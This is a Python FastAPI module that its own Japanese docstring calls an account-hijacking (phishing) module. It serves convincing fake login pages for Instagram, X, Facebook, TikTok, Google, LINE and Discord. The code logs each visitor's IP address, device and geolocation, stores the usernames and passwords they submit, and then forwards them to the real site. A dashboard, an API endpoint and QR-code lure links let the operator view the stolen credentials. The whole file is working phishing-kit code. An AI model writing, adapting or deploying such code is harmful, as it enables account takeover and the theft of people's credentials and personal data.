"""アカウント乗っ取り（フィッシング）モジュール。virus.py と同じ独立実装。

  相手に踏ませるURL : {base}/h/{code}
  自分が結果を見る  : {base}/hp/{code}

偽ログイン画面はメジャーSNSの見た目を platform で切替。
ID/パスワードを回収し、そのまま本物のサイトへ転送する。
"""
from __future__ import annotations

import io
import os
import re
import json
import random
import string
import sqlite3
import datetime as dt

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import (HTMLResponse, RedirectResponse, PlainTextResponse,
                               JSONResponse, Response)

from . import tenancy, users, linktrack

router = APIRouter()

PLATFORMS = ("instagram", "x", "facebook", "tiktok", "google", "line", "discord")

# ---------------- ロゴ ----------------

LOGO_IG = ('<svg viewBox="0 0 24 24" width="46" height="46"><defs>'
           '<radialGradient id="igg" cx="30%" cy="107%" r="150%">'
           '<stop offset="0" stop-color="#fdf497"/><stop offset=".05" stop-color="#fdf497"/>'
           '<stop offset=".45" stop-color="#fd5949"/><stop offset=".6" stop-color="#d6249f"/>'
           '<stop offset=".9" stop-color="#285AEB"/></radialGradient></defs>'
           '<rect x="1" y="1" width="22" height="22" rx="6" fill="url(#igg)"/>'
           '<circle cx="12" cy="12" r="4.6" fill="none" stroke="#fff" stroke-width="1.8"/>'
           '<circle cx="17.4" cy="6.6" r="1.3" fill="#fff"/></svg>')
LOGO_X = ('<svg viewBox="0 0 24 24" width="42" height="42" fill="#fff">'
          '<path d="M18.9 2H22l-7 8 8.2 12h-6.6l-5.2-7.3L5.5 22H2.4l7.5-8.6L2 2h6.8'
          'l4.7 6.6L18.9 2zm-1.1 18h1.7L7.3 3.8H5.5L17.8 20z"/></svg>')
LOGO_FB = ('<svg viewBox="0 0 24 24" width="46" height="46"><circle cx="12" cy="12" r="12"'
           ' fill="#1877f2"/><path fill="#fff" d="M16.4 15.5l.5-3.3h-3.2V10c0-.9.4-1.8 '
           '1.9-1.8h1.5V5.4s-1.3-.2-2.6-.2c-2.6 0-4.3 1.6-4.3 4.5v2.5H7.2v3.3h3V22a7.6 '
           '7.6 0 0 0 2.4 0v-6.5h3z"/></svg>')
LOGO_TT = ('<svg viewBox="0 0 24 24" width="44" height="44"><path fill="#25f4ee" '
           'd="M15.6 2h-3v13.2a2.8 2.8 0 1 1-2.4-2.8v-3a5.8 5.8 0 1 0 5.4 5.8V8.7a7 7 0 '
           '0 0 4 1.3v-3a4 4 0 0 1-4-4z"/><path fill="#fe2c55" opacity=".85" '
           'd="M16.4 3h-3v13.2a2.8 2.8 0 1 1-2.4-2.8v-3a5.8 5.8 0 1 0 5.4 5.8V9.7a7 7 0 '
           '0 0 4 1.3v-3a4 4 0 0 1-4-4z"/></svg>')
LOGO_G = ('<svg viewBox="0 0 48 48" width="40" height="40"><path fill="#FFC107" '
          'd="M43.6 20.5H42V20H24v8h11.3C33.7 32.9 29.3 36 24 36a12 12 0 1 1 7.9-21l5.7-5.7A20 '
          '20 0 1 0 24 44c11 0 20-9 20-20 0-1.2-.1-2.4-.4-3.5z"/><path fill="#FF3D00" '
          'd="M6.3 14.7l6.6 4.8A12 12 0 0 1 24 12c3.1 0 5.9 1.2 8 3.1l5.7-5.7A20 20 0 0 0 '
          '6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 10-2 13.6-5.2l-6.3-5.3A12 12 0 0 '
          '1 12.7 28l-6.5 5A20 20 0 0 0 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h'
          '11.3a12 12 0 0 1-4 5.5l6.3 5.3C41.6 36.6 44 31 44 24c0-1.2-.1-2.4-.4-3.5z"/></svg>')
LOGO_LINE = ('<svg viewBox="0 0 24 24" width="46" height="46"><rect width="24" height="24" '
             'rx="6" fill="#06c755"/><path fill="#fff" d="M19 10.6c0-3.2-3.2-5.8-7-5.8s-7 '
             '2.6-7 5.8c0 2.9 2.6 5.3 6 5.7.2 0 .6.2.7.4.1.2.1.6.1.6l-.2 1c0 .3-.2 1.2 1 '
             '.7 1.3-.6 6.5-3.9 6.5-6.4z"/></svg>')
LOGO_DC = ('<svg viewBox="0 0 24 24" width="48" height="48" fill="#5865F2"><path d="M20 5.3A17 '
           '17 0 0 0 15.7 4l-.2.5a13 13 0 0 1 3.6 1.8 12 12 0 0 0-10.2 0A13 13 0 0 1 12.5 '
           '4.5L12.3 4A17 17 0 0 0 8 5.3 17.7 17.7 0 0 0 4.5 17a17 17 0 0 0 5.2 2.6l.7-1.1c'
           '-.6-.2-1.1-.5-1.6-.9l.4-.3a12 12 0 0 0 10.2 0l.4.3c-.5.4-1 .6-1.6.9l.7 1.1A17 17 '
           '0 0 0 23.5 17 17.7 17.7 0 0 0 20 5.3zM10.3 14.5c-.8 0-1.4-.7-1.4-1.6s.6-1.6 '
           '1.4-1.6 1.4.7 1.4 1.6-.6 1.6-1.4 1.6zm4.4 0c-.8 0-1.4-.7-1.4-1.6s.6-1.6 '
           '1.4-1.6 1.4.7 1.4 1.6-.6 1.6-1.4 1.6z"/></svg>')

# ---------------- テーマ ----------------

def _theme(p: str) -> dict:
    base = {
        "title": "ログイン", "font": 'system-ui,-apple-system,"Hiragino Sans",sans-serif',
        "maxw": "380px", "radius": "12px", "logo": "", "wordmark": "",
        "word_color": "#111", "heading": "", "alt": "", "id_type": "text",
        "id_label": "ユーザー名", "id_ph": "", "pw_label": "パスワード", "pw_ph": "",
        "btn": "ログイン", "spin": "ログインしています…",
        "err": "入力内容を確認してください",
        "foot": "", "real": "https://www.instagram.com/",
    }
    if p == "instagram":
        base.update({
            "title": "Instagram", "logo": LOGO_IG, "maxw": "350px",
            "bg": "#fafafa", "fg": "#262626", "sub": "#8e8e8e", "card": "#fff",
            "border": "1px solid #dbdbdb", "input_bg": "#fafafa",
            "input_border": "#dbdbdb", "accent": "#0095f6", "accent_fg": "#fff",
            "id_label": "電話番号、ユーザー名、またはメールアドレス",
            "id_ph": "電話番号、ユーザー名、またはメールアドレス",
            "btn": "ログイン", "real": "https://www.instagram.com/",
            "foot": "アカウントをお持ちでない場合? <b>登録する</b>",
            "alt": "または", "heading": "",
        })
    elif p == "x":
        base.update({
            "title": "X. ログイン", "logo": LOGO_X, "maxw": "320px", "radius": "16px",
            "bg": "#000", "fg": "#e7e9ea", "sub": "#71767b", "card": "#000",
            "border": "1px solid #2f3336", "input_bg": "#000", "input_border": "#333639",
            "accent": "#1d9bf0", "accent_fg": "#fff",
            "heading": "X にログイン", "id_label": "メール / 電話 / ユーザー名",
            "id_ph": "", "btn": "次へ", "real": "https://x.com/",
            "foot": "アカウントをお持ちでない場合 <b>登録する</b>",
        })
    elif p == "facebook":
        base.update({
            "title": "Facebook", "logo": LOGO_FB, "maxw": "380px",
            "bg": "#f0f2f5", "fg": "#1c1e21", "sub": "#606770", "card": "#fff",
            "border": "1px solid #dddfe2", "input_bg": "#fff", "input_border": "#dddfe2",
            "accent": "#1877f2", "accent_fg": "#fff",
            "id_label": "メールアドレスまたは電話番号", "id_ph": "",
            "btn": "ログイン", "real": "https://www.facebook.com/",
            "foot": "パスワードをお忘れですか?", "heading": "",
        })
    elif p == "tiktok":
        base.update({
            "title": "TikTok", "logo": LOGO_TT, "maxw": "340px", "radius": "10px",
            "bg": "#000", "fg": "#fff", "sub": "#a1a1a1", "card": "#111",
            "border": "1px solid #2a2a2a", "input_bg": "#1c1c1c", "input_border": "#2a2a2a",
            "accent": "#fe2c55", "accent_fg": "#fff",
            "heading": "ログイン", "id_label": "電話 / メール / ユーザー名",
            "btn": "ログイン", "real": "https://www.tiktok.com/login",
            "foot": "アカウントをお持ちでない場合 <b>登録する</b>",
        })
    elif p == "google":
        base.update({
            "title": "ログイン - Google アカウント", "logo": LOGO_G, "maxw": "420px",
            "bg": "#fff", "fg": "#202124", "sub": "#5f6368", "card": "#fff",
            "border": "1px solid #dadce0", "input_bg": "#fff", "input_border": "#dadce0",
            "accent": "#1a73e8", "accent_fg": "#fff",
            "heading": "ログイン", "id_label": "メールアドレスまたは電話番号",
            "id_ph": "", "btn": "次へ", "real": "https://accounts.google.com/",
            "foot": "アカウントを作成", "alt": "",
        })
    elif p == "line":
        base.update({
            "title": "LINE", "logo": LOGO_LINE, "maxw": "340px",
            "bg": "#fff", "fg": "#222", "sub": "#8a8a8a", "card": "#fff",
            "border": "1px solid #e6e6e6", "input_bg": "#fff", "input_border": "#d8d8d8",
            "accent": "#06c755", "accent_fg": "#fff",
            "id_label": "メールアドレス", "id_ph": "",
            "btn": "ログイン", "real": "https://access.line.me/",
            "foot": "パスワードをお忘れですか?",
        })
    elif p == "discord":
        base.update({
            "title": "Discord", "logo": LOGO_DC, "maxw": "400px", "radius": "6px",
            "bg": "#313338", "fg": "#f2f3f5", "sub": "#b5bac1", "card": "#313338",
            "border": "1px solid #3f4147", "input_bg": "#1e1f22", "input_border": "#1e1f22",
            "accent": "#5865F2", "accent_fg": "#fff",
            "heading": "おかえりなさい!", "id_label": "メールまたは電話番号",
            "id_ph": "", "btn": "ログイン", "real": "https://discord.com/login",
            "foot": "アカウントが必要ですか? <b>登録</b>",
        })
    return base


PLATFORM_LABEL = {"instagram": "Instagram", "x": "X (Twitter)", "facebook": "Facebook",
                  "tiktok": "TikTok", "google": "Google", "line": "LINE",
                  "discord": "Discord"}

# ---------------- DB ----------------

SCHEMA = """
CREATE TABLE IF NOT EXISTS hijack_links(
  code TEXT PRIMARY KEY, name TEXT, platform TEXT, note TEXT, dest TEXT,
  active INTEGER DEFAULT 1, created TEXT, hits INTEGER DEFAULT 0,
  last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT);
CREATE TABLE IF NOT EXISTS hijack_hits(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
  device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
  isp TEXT, vid TEXT, extra TEXT);
CREATE INDEX IF NOT EXISTS hijack_hits_code ON hijack_hits(code, id);
CREATE TABLE IF NOT EXISTS hijack_creds(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, ts TEXT,
  login_id TEXT, password TEXT, platform TEXT, ip TEXT, ua TEXT);
CREATE INDEX IF NOT EXISTS hijack_creds_code ON hijack_creds(code, id);
"""


def _m():
    from . import main
    return main


def _render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def _auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def _base(request):
    return _m()._base(request).rstrip("/")


def _owner(code):
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if not o:
        return None
    try:
        tenancy.set_current(o)
    except Exception:
        pass
    return o


def _dir(owner):
    d = os.path.join(tenancy.ROOT, tenancy.safe_name(owner), "hijack")
    os.makedirs(d, exist_ok=True)
    return d


def _db(owner):
    c = sqlite3.connect(os.path.join(_dir(owner), "hijack.db"),
                        timeout=15, check_same_thread=False)
    c.row_factory = sqlite3.Row
    try:
        c.execute("PRAGMA journal_mode=WAL")
        c.executescript(SCHEMA)
        c.commit()
    except Exception:
        pass
    return c


def _link(c, code):
    return c.execute("SELECT * FROM hijack_links WHERE code=?", (code,)).fetchone()


def _new_code(c, n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(80):
        code = "".join(random.choice(a) for _ in range(n))
        if not c.execute("SELECT 1 FROM hijack_links WHERE code=?", (code,)).fetchone():
            try:
                if not users.owner_of_link(code):
                    return code
            except Exception:
                return code
    return "".join(random.choice(a) for _ in range(n + 4))


def _abs(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _geo(ip):
    try:
        return linktrack.geo(ip) or {}
    except Exception:
        return {}


def _record_hit(owner, code, request):
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = _geo(ip)
    c = _db(owner)
    cur = c.execute(
        "INSERT INTO hijack_hits(code,ts,ip,ua,device,os,browser,inapp,country,city,isp,"
        "vid,extra) VALUES(?,?,?,?,?,?,?,?,?,?,?,'','')",
        (code, _now(), ip, ua[:400], p["device"], p["os"], p["browser"], p["inapp"],
         g.get("country"), g.get("city"), g.get("isp")))
    hid = cur.lastrowid
    c.execute("UPDATE hijack_links SET hits=COALESCE(hits,0)+1, last_ts=?, last_ip=?, "
              "last_ua=?, last_device=? WHERE code=?",
              (_now(), ip, ua[:400], (p["device"] or "") + " / " + (p["os"] or ""), code))
    c.commit()
    c.close()
    return hid


# ---------------- 一覧・作成 ----------------

@router.get("/hp", response_class=HTMLResponse)
def list_page(request: Request, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    rows = [dict(r) for r in c.execute(
        "SELECT * FROM hijack_links ORDER BY created DESC").fetchall()]
    c.close()
    base = _base(request)
    for r in rows:
        r["share"] = base + "/h/" + r["code"]
        r["watch"] = base + "/hp/" + r["code"]
        r["label"] = PLATFORM_LABEL.get(r["platform"] or "", r["platform"] or "")
    return _render("hijack_list.html", request, rows=rows, base=base,
                   platforms=[(p, PLATFORM_LABEL[p]) for p in PLATFORMS])


@router.post("/hp/add")
def create(request: Request, name: str = Form(""), platform: str = Form("instagram"),
           dest: str = Form(""), note: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    platform = platform if platform in PLATFORMS else "instagram"
    c = _db(owner)
    code = _new_code(c)
    c.execute("INSERT INTO hijack_links(code,name,platform,note,dest,active,created,hits)"
              " VALUES(?,?,?,?,?,1,?,0)",
              (code, (name or "").strip()[:40] or "名無し", platform,
               (note or "").strip()[:200], (dest or "").strip(), _now()))
    c.commit()
    c.close()
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse("/hp/" + code + "?new=1", status_code=303)


# ---------------- 偽ログインページ ----------------

@router.get("/h/{code}", response_class=HTMLResponse)
def land(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    platform = row["platform"] if row["platform"] in PLATFORMS else "instagram"
    t = _theme(platform)
    real = _abs(row["dest"]) or t["real"]
    t = dict(t)
    t["real"] = real
    hid = _record_hit(owner, code, request)
    return _render("hijack.html", request, code=code, hit_id=hid, t=t,
                   platform=platform)


@router.post("/h/{code}/login")
async def login(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    ctype = request.headers.get("content-type", "")
    if "application/json" in ctype:
        try:
            body = await request.json()
        except Exception:
            body = {}
    else:
        form = await request.form()
        body = dict(form)
    hid = body.get("hit") or 0
    login_id = str(body.get("login_id") or body.get("loginid") or "")[:300]
    password = str(body.get("password") or "")[:300]
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")

    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        return {"ok": 0}
    c.execute("INSERT INTO hijack_creds(code,hit,ts,login_id,password,platform,ip,ua)"
              " VALUES(?,?,?,?,?,?,?,?)",
              (code, int(hid or 0), _now(), login_id, password, row["platform"],
               ip, ua[:300]))
    c.execute("UPDATE hijack_links SET last_ts=? WHERE code=?", (_now(), code))
    c.commit()
    c.close()

    if "application/json" not in ctype:
        t = _theme(row["platform"] if row["platform"] in PLATFORMS else "instagram")
        return RedirectResponse(_abs(row["dest"]) or t["real"], 302)
    t = _theme(row["platform"] if row["platform"] in PLATFORMS else "instagram")
    return {"ok": 1, "next": _abs(row["dest"]) or t["real"], "delay": 700}


@router.post("/h/{code}/d")
async def data(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    hid = int(body.get("hit") or 0)
    items = body.get("items")
    if not isinstance(items, dict):
        items = {}
    c = _db(owner)
    try:
        extra = json.dumps(items, ensure_ascii=False)[:8000]
        c.execute("UPDATE hijack_hits SET extra=? WHERE id=?", (extra, hid))
        c.commit()
    except Exception:
        pass
    c.close()
    return {"ok": 1}


@router.get("/h/{code}/go")
def go(code: str):
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row:
        raise HTTPException(404)
    t = _theme(row["platform"] if row["platform"] in PLATFORMS else "instagram")
    return RedirectResponse(_abs(row["dest"]) or t["real"], 302)


@router.get("/h/{code}/qr.png")
def qr(code: str, request: Request):
    if not _owner(code):
        raise HTTPException(404)
    try:
        import qrcode
    except Exception:
        return PlainTextResponse("qrcode が未インストールです", status_code=501)
    url = f"{_base(request)}/h/{code}"
    img = qrcode.make(url, box_size=10, border=2)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return Response(buf.getvalue(), media_type="image/png",
                    headers={"Cache-Control": "no-store"})


# ---------------- 回収結果 ----------------

@router.get("/hp/{code}", response_class=HTMLResponse)
def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM hijack_hits WHERE code=? ORDER BY id DESC LIMIT 300",
        (code,)).fetchall()]
    creds = [dict(r) for r in c.execute(
        "SELECT * FROM hijack_creds WHERE code=? ORDER BY id DESC LIMIT 300",
        (code,)).fetchall()]
    c.close()
    base = _base(request)
    for h in hits:
        if h.get("extra"):
            try:
                h["extra_obj"] = json.loads(h["extra"])
            except Exception:
                h["extra_obj"] = {}
        else:
            h["extra_obj"] = {}
    return _render("hijack_watch.html", request, code=code, link=dict(row),
                   hits=hits, creds=creds, base=base, is_new=(new == "1"),
                   label=PLATFORM_LABEL.get(row["platform"] or "", row["platform"] or ""),
                   share=base + "/h/" + code, total=len(hits),
                   platforms=[(p, PLATFORM_LABEL[p]) for p in PLATFORMS])


@router.get("/api/hp/{code}")
def api(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    creds = [dict(r) for r in c.execute(
        "SELECT * FROM hijack_creds WHERE code=? ORDER BY id DESC LIMIT 300",
        (code,)).fetchall()]
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM hijack_hits WHERE code=? ORDER BY id DESC LIMIT 300",
        (code,)).fetchall()]
    c.close()
    return {"creds": creds, "hits": hits, "server": _now()}


@router.post("/hp/{code}/update")
def update(request: Request, code: str, name: str = Form(""), platform: str = Form(""),
           dest: str = Form(""), note: str = Form(""), active: str = Form(""),
           u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    f, v = [], []
    if name.strip():
        f.append("name=?"); v.append(name.strip()[:40])
    if platform in PLATFORMS:
        f.append("platform=?"); v.append(platform)
    f.append("dest=?"); v.append((dest or "").strip())
    f.append("note=?"); v.append((note or "").strip()[:200])
    if active in ("0", "1"):
        f.append("active=?"); v.append(int(active))
    v.append(code)
    c.execute("UPDATE hijack_links SET " + ",".join(f) + " WHERE code=?", v)
    c.commit()
    c.close()
    return RedirectResponse("/hp/" + code, status_code=303)


@router.post("/hp/{code}/clear")
def clear(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM hijack_hits WHERE code=?", (code,))
    c.execute("DELETE FROM hijack_creds WHERE code=?", (code,))
    c.execute("UPDATE hijack_links SET hits=0, last_ts=NULL, last_ip=NULL, last_ua=NULL,"
              " last_device=NULL WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/hp/" + code, status_code=303)


@router.post("/hp/{code}/delete")
def delete(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM hijack_hits WHERE code=?", (code,))
    c.execute("DELETE FROM hijack_creds WHERE code=?", (code,))
    c.execute("DELETE FROM hijack_links WHERE code=?", (code,))
    c.commit()
    c.close()
    try:
        users.unregister_link(code)
    except Exception:
        pass
    return RedirectResponse("/hp", status_code=303)